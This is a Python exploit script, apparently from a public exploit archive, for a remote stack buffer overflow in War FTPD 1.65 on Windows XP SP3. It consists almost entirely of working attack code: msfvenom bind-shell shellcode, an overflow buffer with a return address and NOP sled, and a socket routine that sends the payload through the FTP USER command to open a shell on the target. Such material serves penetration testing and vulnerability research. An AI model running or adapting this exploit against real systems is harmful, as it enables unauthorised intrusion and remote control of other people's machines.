"""
Full title:	War FTPD 1.65 Remote Stack Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	http://www.jgaa.com
Version:	War FTPD 1.65
Tested on:	Windows XP SP3
Category:	remote exploit
Platform:	windows
"""
#!/usr/bin/python
import socket, sys
# @chars is used for user@host
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0a\x0d\x40"
shellcode=("\xda\xd4\xbb\x81\x49\xfc\xd4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x53\x31\x58\x17\x83\xe8\xfc\x03\xd9\x5a\x1e\x21\x25\xb4\x5c"
"\xca\xd5\x45\x01\x42\x30\x74\x01\x30\x31\x27\xb1\x32\x17\xc4"
"\x3a\x16\x83\x5f\x4e\xbf\xa4\xe8\xe5\x99\x8b\xe9\x56\xd9\x8a"
"\x69\xa5\x0e\x6c\x53\x66\x43\x6d\x94\x9b\xae\x3f\x4d\xd7\x1d"
"\xaf\xfa\xad\x9d\x44\xb0\x20\xa6\xb9\x01\x42\x87\x6c\x19\x1d"
"\x07\x8f\xce\x15\x0e\x97\x13\x13\xd8\x2c\xe7\xef\xdb\xe4\x39"
"\x0f\x77\xc9\xf5\xe2\x89\x0e\x31\x1d\xfc\x66\x41\xa0\x07\xbd"
"\x3b\x7e\x8d\x25\x9b\xf5\x35\x81\x1d\xd9\xa0\x42\x11\x96\xa7"
"\x0c\x36\x29\x6b\x27\x42\xa2\x8a\xe7\xc2\xf0\xa8\x23\x8e\xa3"
"\xd1\x72\x6a\x05\xed\x64\xd5\xfa\x4b\xef\xf8\xef\xe1\xb2\x94"
"\xdc\xcb\x4c\x65\x4b\x5b\x3f\x57\xd4\xf7\xd7\xdb\x9d\xd1\x20"
"\x1b\xb4\xa6\xbe\xe2\x37\xd7\x97\x20\x63\x87\x8f\x81\x0c\x4c"
"\x4f\x2d\xd9\xf9\x47\x88\xb2\x1f\xaa\x6a\x63\xa0\x04\x03\x69"
"\x2f\x7b\x33\x92\xe5\x14\xdc\x6f\x06\x0b\x41\xf9\xe0\x41\x69"
"\xaf\xbb\xfd\x4b\x94\x73\x9a\xb4\xfe\x2b\x0c\xfc\xe8\xec\x33"
"\xfd\x3e\x5b\xa3\x76\x2d\x5f\xd2\x88\x78\xf7\x83\x1f\xf6\x96"
"\xe6\xbe\x07\xb3\x90\x23\x95\x58\x60\x2d\x86\xf6\x37\x7a\x78"
"\x0f\xdd\x96\x23\xb9\xc3\x6a\xb5\x82\x47\xb1\x06\x0c\x46\x34"
"\x32\x2a\x58\x80\xbb\x76\x0c\x5c\xea\x20\xfa\x1a\x44\x83\x54"
"\xf5\x3b\x4d\x30\x80\x77\x4e\x46\x8d\x5d\x38\xa6\x3c\x08\x7d"
"\xd9\xf1\xdc\x89\xa2\xef\x7c\x75\x79\xb4\x8d\x3c\x23\x9d\x05"
"\x99\xb6\x9f\x4b\x1a\x6d\xe3\x75\x99\x87\x9c\x81\x81\xe2\x99"
"\xce\x05\x1f\xd0\x5f\xe0\x1f\x47\x5f\x21")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 21))
print sock.recv(1500)
buffer = "A"*485
buffer+="\x53\x93\x42\x7e"
buffer+="\x90"*15
buffer+=shellcode
sock.send("USER " + buffer + "\r\n")
print sock.recv(1500)
sock.send("PASS demo@demo.com\r\n")
print sock.recv(1500)
sock.close()